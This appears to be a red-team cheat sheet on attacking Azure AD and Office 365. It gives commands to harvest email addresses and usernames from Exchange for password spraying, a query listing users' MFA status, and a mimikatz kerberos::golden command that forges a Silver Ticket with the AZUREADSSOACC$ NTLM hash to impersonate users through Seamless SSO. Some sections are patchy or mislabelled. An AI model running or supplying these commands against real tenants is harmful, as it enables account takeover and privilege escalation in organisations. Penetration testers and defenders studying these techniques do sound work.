# Password Spraying
**By connecting to Outlook Web Access Portal and utilizing the FindPeople method, it is able to gather the list of all email addresses**
```
Get-GlobalAddressList -ExchHostname outlook.office365.com -UserName thureinsoe@insomnia.com -Password 123456%*@aA -OutFile global-address-list.txt

```
# Exchange Service
Connecting to Exchange Service, it is also able to retrieve the Active Directory username corresponding to the given email address
```
Get-ADUsernameFromEWS -EmailList gotham-emails.txt -ExchHostname outlook.office365.com -Remote
```
# Enabling Multi-Factor Authentication Users
The following MSOnline PowerShell command allows Azure AD administrators to list Azure AD users and the state of their MFA configuration
```
Get-MsolUser -EnabledFilter EnabledOnly -MaxResults 50000 | select DisplayName,UserPrincipalName,@{N="MFA Status"; E={ if( $_.StrongAuthenticationRequirements.State -ne $null){ $_. StrongAuthenticationRequirements.State} else { "Disabled"}}} | export-csv mfaresults.csv
```
# Password Hash Synchronization (PHS)
Password hash synchronization is one of the sign-in methods used to accomplish hybrid identity. Azure AD Connect synchronizes a hash, of the hash, of a user's password from an on-premises Active Directory instance to a cloud-based Azure AD instance.

Password hash synchronization is an extension to the directory synchronization feature implemented by Azure AD Connect sync. You can use this feature to sign in to Azure AD services like Office 365. You sign in to the service by using the same password you use to sign in to your on-premises Active Directory instance.


**This attack is not actually targeting Azure AD but exploiting one of its features in order to escalate privileges on the on-premise Active Directory domain it is synchronized with. Remember Password Hash Synchronization? As explained earlier in this post, a synchronisation account is created by Azure AD Connect on the on-premises Active Directory**

![Image of Yaktocat](https://security4cloud.fr/wp-content/uploads/2019/07/PasswordSync.png)



# Seamless Single Sign-On (SSO)
Azure Active Directory Seamless Single Sign-On (Azure AD Seamless SSO) automatically signs users in when they are on their corporate devices connected to your corporate network. When enabled, users don't need to type in their passwords to sign in to Azure AD. This feature provides your users easy access to your cloud-based applications without needing any additional on-premises components.**When the user wants to connect to Azure AD, the Domain Controller provides him a service ticket for Azure AD. Service tickets are encrypted with the password of a computer account named AZUREADSSOACC$, automatically created when enabling this feature**

In order to do so, the following parameters are required:

* Username of the user to impersonate.
* Domain name.
* NTLM hash of the AZUREADSSOACC$ account.
* SID of the user to impersonate.
* Target service, which is HTTP/aadg.windows.net.nsatc.net.

**Having this information we can now create and use the Silver Ticket on any Windows computer connected to the internet Service**
```
kerberos::golden /user:NyaMeeEain /domain:insomnia.com /rc4:f9969e088b2c13d93833d0ce436c76dd /sid:S-1-5-21-2121516926-2695613149-3163776784 /id:1234 /target:XXXXXXX.net /service:HTTP /ptt
```
# References
* [AZURE AD INTRODUCTION FOR RED TEAMERS](https://www.synacktiv.com/en/publications/azure-ad-introduction-for-red-teamers.html)
* [Password Hash Sync Deep Dive](https://www.eshlomo.us/password-hash-sync-deep-dive/)